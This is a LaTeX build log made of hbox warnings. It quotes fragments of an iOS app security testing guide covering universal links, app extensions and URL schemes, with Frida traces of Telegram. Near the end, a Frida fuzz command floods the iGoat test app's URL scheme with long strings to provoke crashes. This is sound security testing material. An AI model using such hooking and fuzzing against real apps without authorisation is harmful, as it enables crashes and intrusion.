<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e23c83cdb5b3794160113d98a0bccc36eb3be1b6.
png" > [694]
Overfull \hbox (130.58942pt too wide) in paragraph at lines 39905--39905
[] \TU/SourceCodePro(6)/m/n/10.95 11186 ms     |    | +[CLLocationManager _auth
orizationStatusForBundleIdentifier:0x0 bundle:0x0][] 

Overfull \hbox (64.88943pt too wide) in paragraph at lines 39940--39940
[]  \TU/SourceCodePro(6)/m/n/10.95 3630 ms     | -[CLLocationManager initWithEf
fectiveBundleIdentifier:0x0 bundle:0x0][] 

Overfull \hbox (183.14935pt too wide) in paragraph at lines 39940--39940
[]\TU/SourceCodePro(6)/m/n/10.95 0x1031aa158 TelegramUI!+[TGLocationUtils reque
stWhenInUserLocationAuthorizationWithLocationManager:][] 

Overfull \hbox (42.98938pt too wide) in paragraph at lines 39940--39940
[]    \TU/SourceCodePro(6)/m/n/10.95 0x10337e2c0 TelegramUI!-[TGLocationPickerC
ontroller initWithContext:intent:][] 

Overfull \hbox (252.63443pt too wide) in paragraph at lines 39942--39950
\TU/SourceSansPro(0)/m/n/10.95 Status.authorizedWhenInUse[][]) and was called b
y \TU/SourceCodePro(6)/m/n/10.95 +[TGLocationUtils requestWhenInUserLocationAut
horizationWithLocationManager:]\TU/SourceSansPro(0)/m/n/10.95 .
[695]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/0b7f0c46917539212ca389968c59a617a2f79b41.
png" > [696] [697]
Overfull \hbox (198.84799pt too wide) in paragraph at lines 40126--40132
\TU/SourceCodePro(6)/m/n/10.95 https://<domain>/apple-app-site-association \TU/
SourceSansPro(0)/m/n/10.95 or \TU/SourceCodePro(6)/m/n/10.95 https://<domain>/.
well-known/apple-app-site-association\TU/SourceSansPro(0)/m/n/10.95 . 
[698]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d8998c087e399a85eecdd91878167c02546f33d5.
png" > [699]
Underfull \hbox (badness 4531) in paragraph at lines 40213--40217
[]\TU/SourceSansPro(0)/m/n/10.95 In order to receive links and handle them appr
opriately, the app delegate has to implement

Underfull \hbox (badness 1377) in paragraph at lines 40213--40217
[][]\TU/SourceCodePro(6)/m/n/10.95 application:continueUserActivity:restoration
Handler:[][]\TU/SourceSansPro(0)/m/n/10.95 . If you have the original

Overfull \hbox (20.3754pt too wide) in paragraph at lines 40225--40234
\TU/SourceCodePro(6)/m/n/10.95 NSUserActivity \TU/SourceSansPro(0)/m/n/10.95 ob
ject with an \TU/SourceCodePro(6)/m/n/10.95 activityType \TU/SourceSansPro(0)/m
/n/10.95 value of \TU/SourceCodePro(6)/m/n/10.95 NSUserActivityTypeBrowsingWeb\
TU/SourceSansPro(0)/m/n/10.95 .
[700]
Underfull \hbox (badness 1097) in paragraph at lines 40278--40287
[]\TU/SourceSansPro(0)/m/n/10.95 As stated in the [][]Apple Developer Documenta
tion[][], when iOS opens an app as the result of a uni-

Underfull \hbox (badness 5217) in paragraph at lines 40278--40287
\TU/SourceSansPro(0)/m/n/10.95 versal link, the app receives an \TU/SourceCodeP
ro(6)/m/n/10.95 NSUserActivity \TU/SourceSansPro(0)/m/n/10.95 object with an \T
U/SourceCodePro(6)/m/n/10.95 activityType \TU/SourceSansPro(0)/m/n/10.95 value 
of

Underfull \hbox (badness 4739) in paragraph at lines 40278--40287
\TU/SourceCodePro(6)/m/n/10.95 NSUserActivityTypeBrowsingWeb\TU/SourceSansPro(0
)/m/n/10.95 . The activity object’s \TU/SourceCodePro(6)/m/n/10.95 webpageURL \
TU/SourceSansPro(0)/m/n/10.95 property contains

Overfull \hbox (75.83939pt too wide) in paragraph at lines 40298--40298
[]\TU/SourceCodePro(6)/m/n/10.95 func application(_ application: UIApplication,
 continue userActivity: NSUserActivity,[] 

Overfull \hbox (95.54948pt too wide) in paragraph at lines 40298--40298
[]                 \TU/SourceCodePro(6)/m/n/10.95 restorationHandler: @escaping
 ([UIUserActivityRestoring]?) -> Void) -> Bool {[] 

Overfull \hbox (174.38939pt too wide) in paragraph at lines 40298--40298
[]    \TU/SourceCodePro(6)/m/n/10.95 if userActivity.activityType == NSUserActi
vityTypeBrowsingWeb, let url = userActivity.webpageURL {[] 
[701]
Overfull \hbox (91.1694pt too wide) in paragraph at lines 40338--40338
[]        \TU/SourceCodePro(6)/m/n/10.95 let components = NSURLComponents(url: 
incomingURL, resolvingAgainstBaseURL: true),[] 

Overfull \hbox (14.51945pt too wide) in paragraph at lines 40338--40338
[]    \TU/SourceCodePro(6)/m/n/10.95 if let albumName = params.first(where: { $
0.name == "albumname" })?.value,[] 
[702]
Overfull \hbox (21.06395pt too wide) in paragraph at lines 40350--40353
[]\TU/SourceSansPro(0)/m/n/10.95 If you have the original source code, you can 
search it for the \TU/SourceCodePro(6)/m/n/10.95 openURL:options:completionHand
ler:

Overfull \hbox (113.06952pt too wide) in paragraph at lines 40376--40376
[]                        \TU/SourceCodePro(6)/m/n/10.95 options: [UIApplicatio
nOpenURLOptionUniversalLinksOnly: true as NSNumber],[] 

Overfull \hbox (14.51956pt too wide) in paragraph at lines 40376--40376
[]                        \TU/SourceCodePro(6)/m/n/10.95 completionHandler: { v
alue in completion.completion(value)}[] 

Underfull \hbox (badness 1565) in paragraph at lines 40378--40384
[]\TU/SourceSansPro(0)/m/n/10.95 Note how the app adapts the \TU/SourceCodePro(
6)/m/n/10.95 scheme \TU/SourceSansPro(0)/m/n/10.95 to “https” before opening it
 and how it uses the option
[703] [704]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e630660530187b6fd1e8abc487b7f7ea1ac607f9.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/78ccba3d3728d1b436149123dac95a31099b24de.
png" > [705]
Overfull \hbox (74.40862pt too wide) in paragraph at lines 40518--40522
[]\TU/SourceSansPro(0)/m/n/10.95 If we repeat the process and hook or trace the
 \TU/SourceCodePro(6)/m/n/10.95 application:continueUserActivity:restorationHan
dler:

Overfull \hbox (1.6642pt too wide) in paragraph at lines 40531--40535
\TU/SourceSansPro(0)/m/n/10.95 this example, we will use Telegram, as there are
 no restrictions in its \TU/SourceCodePro(6)/m/n/10.95 apple-app-site-associati
on
[706]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c541fc7b7d3f4dd9ff4b816d9bc3e5ce0484f553.
png" > [707]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 40597--40597
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 
[708]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 40632--40632
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 
[709]
Overfull \hbox (102.1193pt too wide) in paragraph at lines 40672--40672
[]\TU/SourceCodePro(6)/m/n/10.95 $S10TelegramUI0A19ApplicationBindingsC16openUn
iversalUrlyySS_AA0ac4OpenG10Completion...[] 

Overfull \hbox (148.10934pt too wide) in paragraph at lines 40672--40672
[]\TU/SourceCodePro(6)/m/n/10.95 $S10TelegramUI15openExternalUrl7account7contex
t3url05forceD016presentationData18application...[] 

Overfull \hbox (180.95932pt too wide) in paragraph at lines 40672--40672
[]\TU/SourceCodePro(6)/m/n/10.95 $S10TelegramUI31AuthorizationSequenceControlle
rC7account7strings7openUrl5apiId0J4HashAC0A4Core19...[] 

Overfull \hbox (51.74939pt too wide) in paragraph at lines 40686--40686
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 

Overfull \hbox (132.77936pt too wide) in paragraph at lines 40686--40686
[]\TU/SourceCodePro(6)/m/n/10.95 298619 ms     | $S10TelegramUI15openExternalUr
l7account7context3url05forceD016presentationData[] 

Overfull \hbox (99.92947pt too wide) in paragraph at lines 40686--40686
[]                \TU/SourceCodePro(6)/m/n/10.95 18applicationContext20navigati
onController12dismissInputy0A4Core7AccountC_AA[] 

Overfull \hbox (60.50946pt too wide) in paragraph at lines 40686--40686
[]                \TU/SourceCodePro(6)/m/n/10.95 14OpenURLContextOSSSbAA012Pres
entationK0CAA0a11ApplicationM0C7Display0[] 

Overfull \hbox (180.95932pt too wide) in paragraph at lines 40705--40705
[]\TU/SourceCodePro(6)/m/n/10.95 $ xcrun swift-demangle S10TelegramUI15openExte
rnalUrl7account7context3url05forceD016presentationData[] 

Overfull \hbox (187.52933pt too wide) in paragraph at lines 40705--40705
[]\TU/SourceCodePro(6)/m/n/10.95 18applicationContext20navigationController12di
smissInputy0A4Core7AccountC_AA14OpenURLContextOSSSbAA0[] 

Overfull \hbox (95.5494pt too wide) in paragraph at lines 40715--40715
[]    \TU/SourceCodePro(6)/m/n/10.95 account: TelegramCore.Account, context: Te
legramUI.OpenURLContext, url: Swift.String,[] 

Overfull \hbox (21.08942pt too wide) in paragraph at lines 40715--40715
[]    \TU/SourceCodePro(6)/m/n/10.95 forceExternal: Swift.Bool, presentationDat
a: TelegramUI.PresentationData,[] 

Overfull \hbox (71.45941pt too wide) in paragraph at lines 40715--40715
[]    \TU/SourceCodePro(6)/m/n/10.95 navigationController: Display.NavigationCo
ntroller?, dismissInput: () -> ()) -> ()[] 
[710]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 40769--40769
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 

Overfull \hbox (51.74939pt too wide) in paragraph at lines 40769--40769
[]\TU/SourceCodePro(6)/m/n/10.95 context: TelegramUI.OpenURLContext, url: Swift
.String, forceExternal: Swift.Bool,[] 

Overfull \hbox (124.01936pt too wide) in paragraph at lines 40769--40769
[]\TU/SourceCodePro(6)/m/n/10.95 TelegramUI.TelegramApplicationContext, navigat
ionController: Display.NavigationController?,[] 
[711]
Overfull \hbox (101.7325pt too wide) in paragraph at lines 40795--40802
\TU/SourceSansPro(0)/m/n/10.95 hook (e.g. by adding a line like this \TU/Source
CodePro(6)/m/n/10.95 log("userInfo:" + ObjC.Object(args[3]).userInfo().toString
());\TU/SourceSansPro(0)/m/n/10.95 ). 

Overfull \hbox (133.71016pt too wide) in paragraph at lines 40812--40815
[]\TU/SourceSansPro(0)/m/n/10.95 Both rely on the same method when receiving da
ta (\TU/SourceCodePro(6)/m/n/10.95 application:continueUserActivity:restoration
Handler:\TU/SourceSansPro(0)/m/n/10.95 ). 

Overfull \hbox (161.5597pt too wide) in paragraph at lines 40815--40821
[]\TU/SourceSansPro(0)/m/n/10.95 Like universal links, the Handoff’s Activity C
ontinuation must be declared in the \TU/SourceCodePro(6)/m/n/10.95 com.apple.de
veloper.associated-domains
[712]
Overfull \hbox (51.74939pt too wide) in paragraph at lines 40852--40852
[]\TU/SourceCodePro(6)/m/n/10.95 298382 ms  -[AppDelegate application:0x10556b3
c0 continueUserActivity:0x1c4237780[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8f48bb85a349f9e3264a10f6d5ab82d6404eb8b7.
png" > [713] [714]
Overfull \hbox (106.17824pt too wide) in paragraph at lines 40979--40985
[]\TU/SourceSansPro(0)/m/n/10.95 if the app properly \TU/SourceSansPro(0)/m/it/
10.95 verifies the received data \TU/SourceSansPro(0)/m/n/10.95 by looking into
 the implementation of [][]\TU/SourceCodePro(6)/m/n/10.95 application:openURL:o
ptions:[][]
[715]
Overfull \hbox (4.9054pt too wide) in paragraph at lines 41055--41057
[]\TU/SourceSansPro(0)/m/n/10.95 The app also declares the document types it op
ens as we can find the key \TU/SourceCodePro(6)/m/n/10.95 CFBundleDocumentTypes
\TU/SourceSansPro(0)/m/n/10.95 : 
[716]
Overfull \hbox (221.32112pt too wide) in paragraph at lines 41078--41085
\TU/SourceCodePro(6)/m/n/10.95 LSItemContentTypes \TU/SourceSansPro(0)/m/n/10.9
5 and it’s ready to open files with the extensions listed in \TU/SourceCodePro(
6)/m/n/10.95 UTTypeTagSpecification/"public.filename-extension"\TU/SourceSansPr
o(0)/m/n/10.95 .

Underfull \hbox (badness 3229) in paragraph at lines 41104--41106
[]\TU/SourceSansPro(0)/m/n/10.95 The \TU/SourceCodePro(6)/m/n/10.95 excludedAct
ivityTypes\TU/SourceSansPro(0)/m/n/10.95 : an array of the Activity Types that 
are not supported,

Overfull \hbox (71.8354pt too wide) in paragraph at lines 41113--41117
[]\TU/SourceSansPro(0)/m/n/10.95 Hook the method we have seen in the static ana
lysis ([][]\TU/SourceCodePro(6)/m/n/10.95 init(activityItems:applicationActivit
ies:)[][]\TU/SourceSansPro(0)/m/n/10.95 )
[717] [718] [719] [720]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/bd8dc141de1388af244f55cf297a00d01629c14f.
png" >
Overfull \hbox (65.98448pt too wide) in paragraph at lines 41334--41334
 []                    \TU/SourceCodePro(6)/m/n/10.95 /Containers/com.some.file
manager/Documents/Inbox/OWASP_MASVS.pdf[] 

Overfull \hbox (37.5144pt too wide) in paragraph at lines 41334--41334
 []    \TU/SourceCodePro(6)/m/n/10.95 UIApplicationOpenURLOptionsSourceApplicat
ionKey = "com.apple.sharingd";[] 

Overfull \hbox (140.44437pt too wide) in paragraph at lines 41334--41334
 []    \TU/SourceCodePro(6)/m/n/10.95 "_UIApplicationOpenURLOptionsSourceProces
sHandleKey" = "<FBSProcessHandle: 0x1c3a63140;[] 

Overfull \hbox (11.23476pt too wide) in paragraph at lines 41334--41334
 []                                                                \TU/SourceCo
dePro(6)/m/n/10.95 sharingd:605; valid: YES>";[] 

Overfull \hbox (164.53435pt too wide) in paragraph at lines 41334--41334
 []\TU/SourceCodePro(6)/m/n/10.95 0x18c7930d8 UIKit!__58-[UIApplication _applic
ationOpenURLAction:payload:origin:]_block_invoke[] 
[721]
Overfull \hbox (65.98438pt too wide) in paragraph at lines 41334--41334
 []\TU/SourceCodePro(6)/m/n/10.95 0x1857cdc34 FrontBoardServices!-[FBSSerialQue
ue _performNextFromRunLoopSource][] 

Overfull \hbox (1.37955pt too wide) in paragraph at lines 41357--41357
[]                            \TU/SourceCodePro(6)/m/n/10.95 /com.some.filemana
ger/Documents/Inbox/OWASP_MASVS.pdf[] 

Overfull \hbox (137.15936pt too wide) in paragraph at lines 41357--41357
[]\TU/SourceCodePro(6)/m/n/10.95 0x18c7930d8 UIKit!__58-[UIApplication _applica
tionOpenURLAction:payload:origin:]_block_invoke[] 

Overfull \hbox (21.08937pt too wide) in paragraph at lines 41357--41357
[]\TU/SourceCodePro(6)/m/n/10.95 0x1857cd9f4 FrontBoardServices!__FBSSERIALQUEU
E_IS_CALLING_OUT_TO_A_BLOCK__[] 

Underfull \hbox (badness 3128) in paragraph at lines 41359--41370
[]\TU/SourceSansPro(0)/m/n/10.95 If you look at the stack trace, you can see ho
w \TU/SourceCodePro(6)/m/n/10.95 application:openURL:options: \TU/SourceSansPro
(0)/m/n/10.95 called
[722]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/5473929e7bf77cdcc33fa8e73d8852d5453b9fa9.
png" > [723]
Overfull \hbox (21.48004pt too wide) in paragraph at lines 41503--41506
[]\TU/SourceSansPro(0)/m/n/10.95 If you have the original source code you can s
earch for all occurrences of \TU/SourceCodePro(6)/m/n/10.95 NSExtensionPointIde
ntifier

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/557a97dedf920b66a40f2e92cd9f0010948caa4d.
png" > [724]
Overfull \hbox (21.0894pt too wide) in paragraph at lines 41548--41548
[]    \TU/SourceCodePro(6)/m/n/10.95 /var/containers/Bundle/Application/15E6A58
F-1CA7-44A4-A9E0-6CA85B65FA35/[] 

Overfull \hbox (71.45897pt too wide) in paragraph at lines 41548--41548
[]\TU/SourceCodePro(6)/m/n/10.95 ------------  -------  ------------------  ---
---  -------   -------------------------[] 

Overfull \hbox (16.70961pt too wide) in paragraph at lines 41548--41548
[]\TU/SourceCodePro(6)/m/n/10.95 Directory         493  None                Tru
e    False     NotificationContent.appex[] 
[725]
Underfull \hbox (badness 4995) in paragraph at lines 41593--41602
[]\TU/SourceSansPro(0)/m/n/10.95 Remember that app extensions and their contain
ing apps do not have direct access to each

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/58e3d56af1f679e03a8f5cb31471a7c09d6e23c2.
png" >
Overfull \hbox (174.45512pt too wide) in paragraph at lines 41616--41622
[]\TU/SourceSansPro(0)/m/n/10.95 It is possible to reject a specific type of ap
p extension by using the method [][]\TU/SourceCodePro(6)/m/n/10.95 application:
shouldAllowExtensionPointIdentifier:[][]\TU/SourceSansPro(0)/m/n/10.95 .
[726]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/73067a4b013a3b6059ad9d5d1dcc72d0079ba9b8.
png" > [727]
Overfull \hbox (45.17938pt too wide) in paragraph at lines 41672--41672
[]\TU/SourceCodePro(6)/m/n/10.95 0x18284355c Foundation!-[NSExtension _itemProv
iderForPayload:extensionContext:][] 

Overfull \hbox (143.72934pt too wide) in paragraph at lines 41672--41672
[]\TU/SourceCodePro(6)/m/n/10.95 0x1828447a4 Foundation!-[NSExtension _loadItem
ForPayload:contextIdentifier:completionHandler:][] 

Overfull \hbox (47.36937pt too wide) in paragraph at lines 41672--41672
[]\TU/SourceCodePro(6)/m/n/10.95 0x182973224 Foundation!__NSXPCCONNECTION_IS_CA
LLING_OUT_TO_EXPORTED_OBJECT_S3__[] 

Overfull \hbox (58.31937pt too wide) in paragraph at lines 41672--41672
[]\TU/SourceCodePro(6)/m/n/10.95 0x182971968 Foundation!-[NSXPCConnection _deco
deAndInvokeMessageWithEvent:flags:][] 

Overfull \hbox (145.91937pt too wide) in paragraph at lines 41672--41672
[]    \TU/SourceCodePro(6)/m/n/10.95 "<NSItemProvider: 0x1c46b30e0> {types = (\
n \"public.plain-text\",\n \"public.file-url\"\n)}"[] 

Overfull \hbox (8.29985pt too wide) in paragraph at lines 41683--41688
[]\TU/SourceSansPro(0)/m/n/10.95 The UTIs included in the \TU/SourceCodePro(6)/
m/n/10.95 NSItemProvider \TU/SourceSansPro(0)/m/n/10.95 are \TU/SourceCodePro(6
)/m/n/10.95 public.plain-text \TU/SourceSansPro(0)/m/n/10.95 and \TU/SourceCode
Pro(6)/m/n/10.95 public.file-url\TU/SourceSansPro(0)/m/n/10.95 ,

Overfull \hbox (152.48935pt too wide) in paragraph at lines 41707--41707
[]\TU/SourceCodePro(6)/m/n/10.95 RET: <PKPlugin: 0x1163637f0 ph.telegra.Telegra
ph.Share(5.3) 5B6DE177-F09B-47DA-90CD-34D73121C785[] 

Overfull \hbox (80.21938pt too wide) in paragraph at lines 41707--41707
[]\TU/SourceCodePro(6)/m/n/10.95 1(2) /private/var/containers/Bundle/Applicatio
n/15E6A58F-1CA7-44A4-A9E0-6CA85B65FA35[] 

Overfull \hbox (165.62935pt too wide) in paragraph at lines 41707--41707
[]\TU/SourceCodePro(6)/m/n/10.95 RET: <PKPlugin: 0x10bff7910 com.apple.mobileno
tes.SharingExtension(1.5) 73E4F137-5184-4459-A70A-83[] 

Overfull \hbox (150.29936pt too wide) in paragraph at lines 41707--41707
[]\TU/SourceCodePro(6)/m/n/10.95 F90A1414DC 1(2) /private/var/containers/Bundle
/Application/5E267B56-F104-41D0-835B-F1DAB9AE076D[] 
[728]
Underfull \hbox (badness 10000) in paragraph at lines 41717--41719
[]\TU/SourceCodePro(6)/m/n/10.95 com.apple.mobilenotes.SharingExtension.appex \
TU/SourceSansPro(0)/m/n/10.95 which is receiving and will
[729]
Overfull \hbox (61.00945pt too wide) in paragraph at lines 41788--41794
[]\TU/SourceSansPro(0)/bx/n/10.95 Custom pasteboards \TU/SourceSansPro(0)/m/n/1
0.95 can be created with [][]\TU/SourceCodePro(6)/m/n/10.95 pasteboardWithName:
create:[][] \TU/SourceSansPro(0)/m/n/10.95 or [][]\TU/SourceCodePro(6)/m/n/10.9
5 pasteboardWithUniqueName[][]\TU/SourceSansPro(0)/m/n/10.95 .
[730] [731] [732] [733]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/95cff8add424bdeb2b14d8bcd415271271611314.
png" > [734]
Overfull \hbox (104.919pt too wide) in paragraph at lines 42137--42142
\TU/SourceSansPro(0)/m/n/10.95 rameters by creating appropriately formatted URL
s and opening them with the [][]\TU/SourceCodePro(6)/m/n/10.95 openURL:options:
completionHandler:[][]

Overfull \hbox (7.82901pt too wide) in paragraph at lines 42160--42169
[]\TU/SourceSansPro(0)/m/n/10.95 Before calling the \TU/SourceCodePro(6)/m/n/10
.95 openURL:options:completionHandler: \TU/SourceSansPro(0)/m/n/10.95 method, a
pps can call [][]\TU/SourceCodePro(6)/m/n/10.95 canOpenURL:[][]
[735]
Overfull \hbox (55.19263pt too wide) in paragraph at lines 42180--42187
\TU/SourceSansPro(0)/m/n/10.95 stalled. However, this restriction only applies 
to \TU/SourceCodePro(6)/m/n/10.95 canOpenURL\TU/SourceSansPro(0)/m/n/10.95 , \T
U/SourceSansPro(0)/bx/n/10.95 the \TU/SourceCodePro(6)/bx/n/10.95 openURL:optio
ns:completionHandler:

Overfull \hbox (175.60478pt too wide) in paragraph at lines 42221--42225
[]\TU/SourceCodePro(6)/m/n/10.95 application:didFinishLaunchingWithOptions: \TU
/SourceSansPro(0)/m/n/10.95 method or \TU/SourceCodePro(6)/m/n/10.95 applicatio
n:will-FinishLaunchingWithOptions:\TU/SourceSansPro(0)/m/n/10.95 :

Overfull \hbox (156.8694pt too wide) in paragraph at lines 42261--42261
[]\TU/SourceCodePro(6)/m/n/10.95 func application(_ application: UIApplication,
 open url: URL, sourceApplication: String?) -> Bool {[] 
[736]
Overfull \hbox (97.73941pt too wide) in paragraph at lines 42261--42261
[]\TU/SourceCodePro(6)/m/n/10.95 func application(_ application: UIApplication,
 open url: URL, sourceApplication: String?,[] 

Overfull \hbox (16.70943pt too wide) in paragraph at lines 42261--42261
[]\TU/SourceCodePro(6)/m/n/10.95 func application(_ application: UIApplication,
 handleOpen url: URL) -> Bool {[] 
[737]
Overfull \hbox (25.46942pt too wide) in paragraph at lines 42326--42326
[]    \TU/SourceCodePro(6)/m/n/10.95 options: [UIApplicationOpenURLOptionUniver
salLinksOnly: true as NSNumber],[] 

Overfull \hbox (25.46942pt too wide) in paragraph at lines 42326--42326
[]    \TU/SourceCodePro(6)/m/n/10.95 options: [UIApplicationOpenURLOptionUniver
salLinksOnly: true as NSNumber],[] 

Overfull \hbox (84.59961pt too wide) in paragraph at lines 42343--42343
[]                                        \TU/SourceCodePro(6)/m/n/10.95 string
: "https://telegram.org/deactivate?phone=\(phone)")![] 

Overfull \hbox (40.79941pt too wide) in paragraph at lines 42360--42360
[]\TU/SourceCodePro(6)/m/n/10.95 if documentUri.hasPrefix("file://"), let path 
= URL(string: documentUri)?.path {[] 
[738]
Overfull \hbox (170.00934pt too wide) in paragraph at lines 42360--42360
[]\TU/SourceCodePro(6)/m/n/10.95 guard let dict = TGStringUtils.argumentDiction
ary(inUrlString: String(url[url.index(url.startIndex,[] 

Overfull \hbox (29.84938pt too wide) in paragraph at lines 42360--42360
[]\TU/SourceCodePro(6)/m/n/10.95 if let url = URL(string: "itms-apps://itunes.a
pple.com/app/id\(appStoreId)") {[] 

Overfull \hbox (16.7094pt too wide) in paragraph at lines 42360--42360
[]\TU/SourceCodePro(6)/m/n/10.95 [[WKExtension sharedExtension] openSystemURL:[
NSURL URLWithString:[NSString[] 
[739] [740]
Overfull \hbox (3.5245pt too wide) in paragraph at lines 42501--42501
[]\TU/SourceCodePro(6)/m/n/10 ObjC[].[]classes[].[]UIApplication[].[]sharedAppl
ication[]()[];[]|  

Overfull \hbox (249.8999pt too wide) in paragraph at lines 42510--42515
[]\TU/SourceSansPro(0)/m/n/10.95 Or as in this example from [][]Frida CodeShare
[][] where the author uses the non-public API \TU/SourceCodePro(6)/m/n/10.95 LS
ApplicationWorkspace.openSensitiveURL:withOptions:
[741]
Overfull \hbox (62.69954pt too wide) in paragraph at lines 42570--42570
[]  \TU/SourceCodePro(6)/m/n/10.95 URI                  yes       URI to launch
, eg tel://123456789 or http://www.google.com/[] 
[742] [743]
Overfull \hbox (208.13008pt too wide) in paragraph at lines 42668--42671
[]\TU/SourceSansPro(0)/m/n/10.95 We can also know from where it was called, as 
expected from \TU/SourceCodePro(6)/m/n/10.95 -[UIApplication _applicationOpenUR
LAction:payload:origin:]\TU/SourceSansPro(0)/m/n/10.95 . 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c441621c9bee29c2fbc9a04d05bc8426d67bfff9.
jpg" > [744]
Overfull \hbox (3.5245pt too wide) in paragraph at lines 42699--42699
[]\TU/SourceCodePro(6)/m/n/10 ObjC[].[]classes[].[]UIApplication[].[]sharedAppl
ication[]()[];[]|  
[745]
Overfull \hbox (141.464pt too wide) in paragraph at lines 42739--42746
[]\TU/SourceSansPro(0)/m/n/10.95 The output is truncated for better readability
. This time you see that \TU/SourceCodePro(6)/m/n/10.95 UIApplicationOpenURLOpt
ionsSourceApplicationKey
[746]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a9306a55201426996cd4188ec50973be63efb594.
png" >
Overfull \hbox (21.5245pt too wide) in paragraph at lines 42770--42770
[]\TU/SourceCodePro(6)/m/n/10 $S10TelegramUI15openExternalUrl7account7context3u
rl05forceD016presentationData[]|  

Overfull \hbox (21.5245pt too wide) in paragraph at lines 42771--42771
\TU/SourceCodePro(6)/m/n/10 text20navigationController12dismissInputy0A4Core7Ac
countC_AA14Open|  

Overfull \hbox (69.5245pt too wide) in paragraph at lines 42772--42772
\TU/SourceCodePro(6)/m/n/10 bAA012PresentationK0CAA0a11ApplicationM0C7Display01
0NavigationO0CSgyyctF()[]|  
[747] [748]
Underfull \hbox (badness 7796) in paragraph at lines 42852--42855
[]\TU/SourceCodePro(6)/m/n/10.95 application:openURL:options: \TU/SourceSansPro
(0)/m/n/10.95 handles the URL but does not open it, it calls

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/eecc821a0dd66cce69d08c4b2975ef636b355063.
png" > [749] [750] [751]
Overfull \hbox (87.28583pt too wide) in paragraph at lines 42989--42991
[]\TU/SourceSansPro(0)/m/n/10.95 Check if the app generates a crash report (\TU
/SourceCodePro(6)/m/n/10.95 .ips\TU/SourceSansPro(0)/m/n/10.95 ) in \TU/SourceC
odePro(6)/m/n/10.95 /private/var/mobile/Library/Logs/CrashReporter\TU/SourceSan
sPro(0)/m/n/10.95 . 

Overfull \hbox (98.8994pt too wide) in paragraph at lines 43003--43007
\TU/SourceSansPro(0)/m/n/10.95 iGoat-Swift app supports the following URL schem
e and parameters: \TU/SourceCodePro(6)/m/n/10.95 iGoat://?contactNumber={0}&mes
sage={0}\TU/SourceSansPro(0)/m/n/10.95 . 

Overfull \hbox (45.17938pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 [iPhone::SpringBoard]-> fuzz("iGoat", "iGoat:/
/?contactNumber={0}&message={0}")[] 
[752]
Overfull \hbox (156.86938pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 Opened URL: iGoat://?contactNumber=AAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (156.86938pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 Opened URL: iGoat://?contactNumber=AAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[] 

Overfull \hbox (161.2493pt too wide) in paragraph at lines 43058--43058
[]\TU/SourceCodePro(6)/m/n/10.95 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
